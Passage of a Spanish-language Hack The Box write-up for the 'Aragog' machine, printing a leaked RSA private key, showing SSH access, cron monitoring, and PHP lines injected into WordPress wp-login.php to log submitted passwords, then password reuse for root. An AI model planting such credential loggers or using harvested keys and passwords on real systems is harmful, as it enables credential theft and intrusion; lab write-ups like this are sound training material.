+sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV
+Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH
+zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE
+rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE
+tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3
+HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/
+I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg
+ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7
+HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y
+kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs
+4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+
+7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3
+daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv
+uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA<span class="o">==</span>
+<span class="nt">-----END</span> RSA PRIVATE KEY-----
+</code></pre></div></div>
+
+<p>Nos copiamos la <code class="language-plaintext highlighter-rouge">id_rsa</code> a un archivo con mismo nombre y le damos permisos 600:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ vi id_rsa
+❯ <span class="nb">cat </span>id_rsa
+───────┬──────────────────────────────────────────────────────────────
+       │ File: id_rsa
+───────┼──────────────────────────────────────────────────────────────
+   1   │ <span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
+   2   │ MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d
+   3   │ +YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8
+   4   │ lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn
+   5   │ 1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+
+   6   │ Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd
+   7   │ d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK
+   8   │ AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg
+   9   │ TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD
+  10   │ 9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb
+  11   │ /oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV
+  12   │ 0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1
+  13   │ sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV
+  14   │ Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH
+  15   │ zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE
+  16   │ rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE
+  17   │ tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3
+  18   │ HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/
+  19   │ I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg
+  20   │ ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7
+  21   │ HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y
+  22   │ kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs
+  23   │ 4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+
+  24   │ 7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3
+  25   │ daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv
+  26   │ uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA<span class="o">==</span>
+  27   │ <span class="nt">-----END</span> RSA PRIVATE KEY-----
+❯ <span class="nb">chmod </span>600 id_rsa
+</code></pre></div></div>
+
+<p>Ahora vamos a conectarnos a la máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh <span class="nt">-i</span> id_rsa florian@10.10.10.78
+The authenticity of host <span class="s1">'10.10.10.78 (10.10.10.78)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:phu0FjQg/9nCmL2014AJ9yH4akvraA7Ea5QtE59wqD4.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.10.78<span class="s1">' (ECDSA) to the list of known hosts.
+Last login: Fri Jan 12 13:56:45 2018 from 10.10.14.3
+florian@aragog:~$ whoami
+florian
+florian@aragog:~$
+</span></code></pre></div></div>
+
+<p>Ya estamos dentro de la máquina como el usuario <em>florian</em> y a partir de aquí podemos visualizar la flag (user.txt).  Nos queda escalar privilegios, así que vamos a enumerar un poco el sistema:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>florian@aragog:/var/www/html<span class="nv">$ </span>ll
+total 32
+drwxrwxrwx 4 www-data www-data  4096 Sep 20 12:35 ./
+drwxr-xr-x 3 root     root      4096 Dec 18  2017 ../
+drwxrwxrwx 5 cliff    cliff     4096 Sep 20 12:35 dev_wiki/
+<span class="nt">-rw-r--r--</span> 1 www-data www-data   689 Dec 21  2017 hosts.php
+<span class="nt">-rw-r--r--</span> 1 www-data www-data 11321 Dec 18  2017 index.html
+drw-r--r-- 5 cliff    cliff     4096 Dec 20  2017 zz_backup/
+florian@aragog:/var/www/html<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos que dentro de <code class="language-plaintext highlighter-rouge">var/www/html</code> se tienen varios recursos asociados al sitio web. Algo raro que notamos es que el recurso <code class="language-plaintext highlighter-rouge">dev_wiki/</code> está asignado al grupo y al usuario <em>cliff</em>; pero nosotros como el usuario <em>florian</em> tenemos permisos <code class="language-plaintext highlighter-rouge">rwx</code>. Podemos pensar en ver los archivos dentro de dicho directorio, pero antes de eso, vamos a listar los procesos que se estan ejecutando en el sistema a intervalos regulares con la creación del archivo <code class="language-plaintext highlighter-rouge">procmon.sh</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>florian@aragog:/var/www/html<span class="nv">$ </span><span class="nb">cd</span> /dev/shm/
+florian@aragog:/dev/shm<span class="nv">$ </span><span class="nb">touch </span>procmon.sh
+florian@aragog:/dev/shm<span class="nv">$ </span><span class="nb">chmod</span> +x procmon.sh
+florian@aragog:/dev/shm<span class="nv">$ </span>nano procmon.sh
+florian@aragog:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>procmon.sh 
+<span class="c">#!/bin/bash</span>
+
+<span class="nv">old_process</span><span class="o">=</span><span class="si">$(</span>ps <span class="nt">-eo</span> <span class="nb">command</span><span class="si">)</span>
+
+<span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do
+        </span><span class="nv">new_process</span><span class="o">=</span><span class="si">$(</span>ps <span class="nt">-eo</span> <span class="nb">command</span><span class="si">)</span>
+        diff &lt;<span class="o">(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$old_process</span><span class="s2">"</span><span class="o">)</span> &lt;<span class="o">(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$new_process</span><span class="s2">"</span><span class="o">)</span> | <span class="nb">grep</span> <span class="s2">"[</span><span class="se">\&lt;\&gt;</span><span class="s2">]"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nt">-E</span> <span class="s2">"command|procmon"</span>
+        <span class="nv">old_process</span><span class="o">=</span><span class="nv">$new_process</span>
+<span class="k">done
+
+</span>florian@aragog:/dev/shm<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Ejecutamos nuestro script:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>florian@aragog:/dev/shm<span class="nv">$ </span>./procmon.sh 
+<span class="o">&gt;</span> /usr/sbin/CRON <span class="nt">-f</span>
+<span class="o">&gt;</span> /bin/sh <span class="nt">-c</span> /usr/bin/python /home/cliff/wp-login.py
+<span class="o">&gt;</span> /usr/bin/python /home/cliff/wp-login.py
+&lt; /usr/sbin/CRON <span class="nt">-f</span>
+&lt; /bin/sh <span class="nt">-c</span> /usr/bin/python /home/cliff/wp-login.py
+&lt; /usr/bin/python /home/cliff/wp-login.py
+<span class="o">&gt;</span> /usr/sbin/CRON <span class="nt">-f</span>
+<span class="o">&gt;</span> /usr/sbin/CRON <span class="nt">-f</span>
+<span class="o">&gt;</span> /bin/sh <span class="nt">-c</span> /bin/bash /root/restore.sh
+<span class="o">&gt;</span> /bin/sh <span class="nt">-c</span> /usr/bin/python /home/cliff/wp-login.py
+<span class="o">&gt;</span> /bin/bash /root/restore.sh
+<span class="o">&gt;</span> <span class="nb">rm</span> <span class="nt">-rf</span> /var/www/html/dev_wiki/
+<span class="o">&gt;</span> /usr/bin/python /home/cliff/wp-login.py
+&lt; /usr/sbin/CRON <span class="nt">-f</span>
+&lt; /bin/sh <span class="nt">-c</span> /usr/bin/python /home/cliff/wp-login.py
+&lt; <span class="nb">rm</span> <span class="nt">-rf</span> /var/www/html/dev_wiki/
+&lt; /usr/bin/python /home/cliff/wp-login.py
+<span class="o">&gt;</span> <span class="nb">chmod</span> <span class="nt">-R</span> 777 /var/www/html/dev_wiki/
+&lt; /usr/sbin/CRON <span class="nt">-f</span>
+&lt; /bin/sh <span class="nt">-c</span> /bin/bash /root/restore.sh
+&lt; /bin/bash /root/restore.sh
+&lt; <span class="nb">chmod</span> <span class="nt">-R</span> 777 /var/www/html/dev_wiki/
+^C
+</code></pre></div></div>
+
+<p>Del resultado, vemos que se está ejecutando el recurso <code class="language-plaintext highlighter-rouge">/home/cliff/wp-login.py</code>, un archivo en python relacionado a un posible WordPress (por el <code class="language-plaintext highlighter-rouge">wp-login</code>), tal vez una posible autenticación. Además, vemos que se ejecuta <code class="language-plaintext highlighter-rouge">/root/restore.sh</code> que restablece los archivo en la ruta <code class="language-plaintext highlighter-rouge">/var/www/html/dev_wiki/</code>. Si ingresamos a la página <code class="language-plaintext highlighter-rouge">http://10.10.10.78/dev_wiki</code> , nos redirecciona a <code class="language-plaintext highlighter-rouge">http://aragog/dev_wiki/</code>, así que agremos <strong>aragog</strong> a nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> y así podemos ver el recurso.</p>
+
+<p><img src="/assets/images/htb-aragog/aragog_wiki.png" alt=""></p>
+
+<p>Vemos que el sitio hace uso de WordPress, por lo que debe de existir su panel de administración en <a href="http://aragog/dev_wiki/wp-login.php">wp-admin</a>:</p>
+
+<p><img src="/assets/images/htb-aragog/aragog_wordpress.png" alt=""></p>
+
+<p>Con lo que tenemos, podemos pensar que el programa <code class="language-plaintext highlighter-rouge">/home/cliff/wp-login.py</code> se está autenticando el el portal de login de wordPress y como tenemos permisos para modificar los archivos encontrado en <code class="language-plaintext highlighter-rouge">dev_wiki</code>, podemos obtener las crenciales de login agregando las siguientes líneas en el archivo <code class="language-plaintext highlighter-rouge">wp-login.php</code> (Nota: Hay que hacerlo rápido porque tenemos que recordar que se restablecen los archivos de dicho directorio debido al script <code class="language-plaintext highlighter-rouge">restore.sh</code> ejecutado por el usuario <strong>root</strong>).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>require<span class="o">(</span> <span class="nb">dirname</span><span class="o">(</span>__FILE__<span class="o">)</span> <span class="nb">.</span> <span class="s1">'/wp-load.php'</span> <span class="o">)</span><span class="p">;</span>
+
+<span class="nv">$file</span><span class="o">=</span><span class="s1">'datos_login.txt'</span><span class="p">;</span>
+file_put_contents<span class="o">(</span><span class="nv">$file</span>, print_r<span class="o">(</span><span class="nv">$_POST</span>, <span class="nb">true</span><span class="o">)</span>, FILE_APPEND<span class="o">)</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Con lo anterior, se crea un archivo de nombre <code class="language-plaintext highlighter-rouge">datos_login.txt</code> cuando se intenta autenticar en el panel de login de WordPress. Para ver cuando el archivo se haya creado, monitoreamos el contenido de la carpeta con:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>florian@aragog:/var/www/html/dev_wiki<span class="nv">$ </span>watch <span class="nt">-n</span> 1 <span class="nb">ls</span> <span class="nt">-l</span>
+</code></pre></div></div>
+
+<p>Vemos rápidamente el contenido del archivo <code class="language-plaintext highlighter-rouge">datos_login.txt</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>florian@aragog:/var/www/html/dev_wiki<span class="nv">$ </span><span class="nb">cat </span>datos_login.txt
+Array
+<span class="o">(</span>
+    <span class="o">[</span><span class="nb">pwd</span><span class="o">]</span> <span class="o">=&gt;</span> <span class="o">!</span>KRgYs<span class="o">(</span>JFO!&amp;MTr<span class="o">)</span>lf
+    <span class="o">[</span>wp-submit] <span class="o">=&gt;</span> Log In
+    <span class="o">[</span>testcookie] <span class="o">=&gt;</span> 1
+    <span class="o">[</span>log] <span class="o">=&gt;</span> Administrator
+    <span class="o">[</span>redirect_to] <span class="o">=&gt;</span> http://127.0.0.1/dev_wiki/wp-admin/
+<span class="o">)</span>
+florian@aragog:/var/www/html/dev_wiki<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Y tenemos la contraseña del usuario <strong>Administrator</strong> del portal de WordPress. Podíamos pensar que se está utilizando reutilización de contraseñas y podemos probar para el usuario <strong>root</strong> de la máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>florian@aragog:/var/www/html/dev_wiki<span class="nv">$ </span>su root
+Password: 
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+sh: 0: getcwd<span class="o">()</span> failed: No such file or directory
+root@aragog:/var/www/html/dev_wiki# <span class="nb">cd</span> ..
+chdir: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+root@aragog:..# <span class="nb">whoami
+</span>root
+root@aragog:..#
+</code></pre></div></div>
+
+<p>A partir de aquí ya podemos visualizar la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#file-misconfiguration" class="page__taxonomy-item" rel="tag">File_Misconfiguration</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">PHP</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#xxe" class="page__taxonomy-item" rel="tag">XXE</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-09-20T00:00:00-05:00">September 20, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-mantis/" class="pagination--pager" title="Hack The Box Mantis
+">Previous</a>
+    
+    
+      <a href="/htb-grandpa/" class="pagination--pager" title="Hack The Box Grandpa
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
